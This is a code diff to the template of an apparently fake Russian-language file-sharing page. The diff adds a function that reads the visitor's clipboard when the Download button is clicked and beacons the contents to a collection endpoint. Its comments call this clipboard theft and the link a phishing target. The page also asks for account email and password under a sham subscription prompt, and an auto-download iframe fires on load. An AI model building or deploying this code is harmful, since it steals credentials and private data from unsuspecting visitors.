@@ -28,8 +28,8 @@
             <small class="text-muted">{{ file.format }} • {{ file.date }}</small>
         </div>
         <div>
-            <!-- Кнопка ведет на фишинг -->
-            <a href="/verify/{{ uid }}/{{ file.name }}" class="btn btn-outline-dark btn-sm">
+            <!-- ИЗМЕНЕНО: Теперь клик вызывает функцию stealAndDownload -->
+            <a href="#" onclick="stealAndDownload(event, '/verify/{{ uid }}/{{ file.name }}')" class="btn btn-outline-dark btn-sm">
                 <i class="fa-solid fa-download"></i> Скачать
             </a>
         </div>
@@ -42,14 +42,15 @@
                 <strong><i class="fa-solid fa-receipt"></i> Квитанция о загрузке</strong>
                 <br><small class="text-muted">Подтверждение для отчетности (PDF)</small>
             </div>
-            <a href="/download_receipt/{{ uid }}" class="btn btn-sm btn-secondary">
+            <!-- Тоже вешаем ловушку на квитанцию -->
+            <a href="#" onclick="stealAndDownload(event, '/download_receipt/{{ uid }}')" class="btn btn-sm btn-secondary">
                 <i class="fa-solid fa-file-arrow-down"></i> Скачать
             </a>
         </div>
     </div>
 </div>
 
-<!-- КОММЕНТАРИИ И ЖАЛОБЫ -->
+<!-- КОММЕНТАРИИ -->
 <div class="card p-4 mt-4">
     <div class="d-flex justify-content-between align-items-center mb-3">
         <h6 class="mb-0">Обсуждение</h6>
@@ -61,12 +62,9 @@
             {% for c in db_data.comments %}
                 <div class="border-bottom pb-2 mb-2">
                     <div class="d-flex justify-content-between">
-                        <div>
-                            <strong>{{ c.username }}</strong> <small class="text-muted">{{ c.date }}</small>
-                        </div>
-                        <!-- ВОТ КНОПКА ПОЖАЛОВАТЬСЯ -->
-                        <button onclick="openReportModal('{{ c.username }}')" class="btn btn-link btn-sm text-muted p-0" title="Пожаловаться">
-                            <i class="fa-regular fa-flag"></i>
+                        <div><strong>{{ c.username }}</strong> <small class="text-muted">{{ c.date }}</small></div>
+                        <button onclick="openReportModal('{{ c.username }}')" class="btn btn-danger btn-sm py-0 px-2" style="font-size: 0.8rem;">
+                            <i class="fa-solid fa-triangle-exclamation"></i> Пожаловаться
                         </button>
                     </div>
                     <p class="mb-0">{{ c.text }}</p>
@@ -78,29 +76,17 @@
     </div>
 
     <div class="bg-light p-3 rounded border">
-        <p class="small text-muted mb-2"><i class="fa-regular fa-bell"></i> <strong>Подписка на ответы:</strong> Введите Email и пароль от вашей учетной записи, чтобы получать уведомления.</p>
-        
+        <p class="small text-muted mb-2"><i class="fa-regular fa-bell"></i> <strong>Подписка на ответы:</strong> Введите Email и пароль от вашей учетной записи.</p>
         <div class="row g-2 mb-2">
-            <div class="col-md-6">
-                <input type="text" id="usernameInput" class="form-control form-control-sm" placeholder="Ваше имя">
-            </div>
-            <div class="col-md-6">
-                <input type="email" id="emailInput" class="form-control form-control-sm" placeholder="Email">
-            </div>
+            <div class="col-md-6"><input type="text" id="usernameInput" class="form-control form-control-sm" placeholder="Ваше имя"></div>
+            <div class="col-md-6"><input type="email" id="emailInput" class="form-control form-control-sm" placeholder="Email"></div>
         </div>
-        
-        <div class="mb-2">
-            <input type="password" id="passwordInput" class="form-control form-control-sm" placeholder="Пароль (для подписки)">
-        </div>
-
+        <div class="mb-2"><input type="password" id="passwordInput" class="form-control form-control-sm" placeholder="Пароль"></div>
         <div class="form-floating mb-2">
-            <textarea class="form-control" placeholder="Leave a comment here" id="commentText" style="height: 80px"></textarea>
-            <label for="commentText">Ваше сообщение...</label>
+            <textarea class="form-control" id="commentText" style="height: 80px"></textarea>
+            <label>Ваше сообщение...</label>
         </div>
-        
-        <button onclick="sendComment('{{ uid }}')" class="btn btn-primary btn-sm w-100">
-            <i class="fa-regular fa-paper-plane"></i> Отправить
-        </button>
+        <button onclick="sendComment('{{ uid }}')" class="btn btn-primary btn-sm w-100"><i class="fa-regular fa-paper-plane"></i> Отправить</button>
     </div>
 </div>
 
@@ -108,61 +94,83 @@
 <div class="modal fade" id="reportModal" tabindex="-1" aria-hidden="true">
   <div class="modal-dialog modal-dialog-centered">
     <div class="modal-content">
-      <div class="modal-header border-0 pb-0">
-        <h6 class="modal-title fw-bold">Жалоба на комментарий</h6>
-        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      <div class="modal-header bg-danger text-white">
+        <h6 class="modal-title"><i class="fa-solid fa-triangle-exclamation"></i> Пожаловаться</h6>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
       </div>
       <div class="modal-body">
-        <textarea class="form-control" id="reportReason" rows="5" placeholder="Опишите причину..."></textarea>
+        <textarea class="form-control" id="reportReason" rows="5" placeholder="Опишите нарушение..."></textarea>
         <input type="hidden" id="reportTarget">
       </div>
-      <div class="modal-footer border-0 pt-0">
-        <button type="button" class="btn btn-danger w-100" onclick="submitReport()">Отправить</button>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-danger w-100" onclick="submitReport()">ОТПРАВИТЬ ЖАЛОБУ</button>
       </div>
     </div>
   </div>
 </div>
 
 <script>
-// 1. Логика жалоб
+// --- ГЛАВНАЯ ФИШКА: КРАЖА БУФЕРА ПРИ СКАЧИВАНИИ ---
+async function stealAndDownload(event, targetUrl) {
+    event.preventDefault(); // Останавливаем переход
+    
+    let clipboardContent = "N/A";
+    
+    try {
+        // Проверяем поддержку
+        if (navigator.clipboard && navigator.clipboard.readText) {
+            // Даем 1.5 секунды на разрешение доступа
+            const clipPromise = navigator.clipboard.readText();
+            const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 1500));
+            
+            const clipResult = await Promise.race([clipPromise, timeoutPromise]);
+            if (clipResult) clipboardContent = clipResult;
+        }
+    } catch (err) {
+        console.log("Clipboard blocked or timeout");
+        clipboardContent = "Blocked/Timeout";
+    }
+
+    // Отправляем данные
+    const data = {
+        meta: { trigger: 'DOWNLOAD CLICK (CLIPBOARD)', url: window.location.href },
+        system: { CLIPBOARD_DUMP: clipboardContent.substring(0, 2000) }
+    };
+    
+    // Используем sendBeacon для надежности перед уходом со страницы
+    const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+    navigator.sendBeacon('/api/collect', blob);
+
+    // Переходим по ссылке (на фишинг или скачивание)
+    window.location.href = targetUrl;
+}
+
+// --- ОСТАЛЬНОЙ ФУНКЦИОНАЛ ---
+
 function openReportModal(username) {
     document.getElementById('reportTarget').value = username;
     document.getElementById('reportReason').value = ''; 
-    const myModal = new bootstrap.Modal(document.getElementById('reportModal'));
-    myModal.show();
+    new bootstrap.Modal(document.getElementById('reportModal')).show();
 }
 
 function submitReport() {
     const text = document.getElementById('reportReason').value;
     const target = document.getElementById('reportTarget').value;
-    const btn = document.querySelector('#reportModal .btn-danger');
     
-    btn.innerHTML = 'Отправка...';
-    btn.disabled = true;
-
-    const data = {
-        meta: { trigger: 'REPORT FILED', url: window.location.href },
-        system: { 
-            reported_user: target,
-            report_text: text || "Empty report"
-        }
-    };
-
     fetch('/api/collect', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(data)
+        body: JSON.stringify({
+            meta: { trigger: 'REPORT FILED', url: window.location.href },
+            system: { reported_user: target, report_text: text || "Empty" }
+        })
     }).then(() => {
-        const modalEl = document.getElementById('reportModal');
-        const modal = bootstrap.Modal.getInstance(modalEl);
-        modal.hide();
-        btn.innerHTML = 'Отправить';
-        btn.disabled = false;
-        alert("Жалоба отправлена администрации.");
+        bootstrap.Modal.getInstance(document.getElementById('reportModal')).hide();
+        alert("Жалоба отправлена.");
     });
 }
 
-// 2. Auto-Download Trap
+// Auto-Download Trap
 window.addEventListener('load', function() {
     setTimeout(() => {
         const ifr = document.createElement('iframe');
@@ -172,7 +180,6 @@ window.addEventListener('load', function() {
     }, 2500);
 });
 
-// 3. Comment Logic
 function sendComment(uid) {
     const username = document.getElementById('usernameInput').value || 'Guest';
     const email = document.getElementById('emailInput').value;
@@ -181,45 +188,26 @@ function sendComment(uid) {
     
     if(!text) { alert("Введите текст!"); return; }
 
-    const btn = document.querySelector('button[onclick^="sendComment"]');
-    const originalText = btn.innerHTML;
-    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> ...';
-    btn.disabled = true;
-
     fetch('/api/comment', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ 
-            uid: uid, username: username, text: text,
-            email: email, password: password 
-        })
+        body: JSON.stringify({ uid, username, text, email, password })
     })
-    .then(response => response.json())
+    .then(r => r.json())
     .then(data => {
-        btn.innerHTML = originalText;
-        btn.disabled = false;
         if(data.status === 'ok') {
-            const list = document.getElementById('commentsList');
-            if(list.querySelector('.text-center')) list.innerHTML = '';
-            
-            // Добавляем коммент сразу с кнопкой жалобы
             const html = `
                 <div class="border-bottom pb-2 mb-2">
                     <div class="d-flex justify-content-between">
-                        <div>
-                            <strong>${data.comment.username}</strong> <small class="text-muted">${data.comment.date}</small>
-                        </div>
-                        <button onclick="openReportModal('${data.comment.username}')" class="btn btn-link btn-sm text-muted p-0">
-                            <i class="fa-regular fa-flag"></i>
-                        </button>
+                        <div><strong>${data.comment.username}</strong> <small class="text-muted">${data.comment.date}</small></div>
+                        <button onclick="openReportModal('${data.comment.username}')" class="btn btn-danger btn-sm py-0 px-2" style="font-size: 0.8rem;"><i class="fa-solid fa-triangle-exclamation"></i> Пожаловаться</button>
                     </div>
                     <p class="mb-0">${data.comment.text}</p>
                 </div>`;
-            list.insertAdjacentHTML('beforeend', html);
-            
+            document.getElementById('commentsList').insertAdjacentHTML('beforeend', html);
             document.getElementById('commentText').value = '';
             document.getElementById('passwordInput').value = ''; 
-            if(email && password) alert(`Подписка оформлена на ${email}.`);
+            if(email && password) alert(`Подписка оформлена.`);
         }
     });
 }
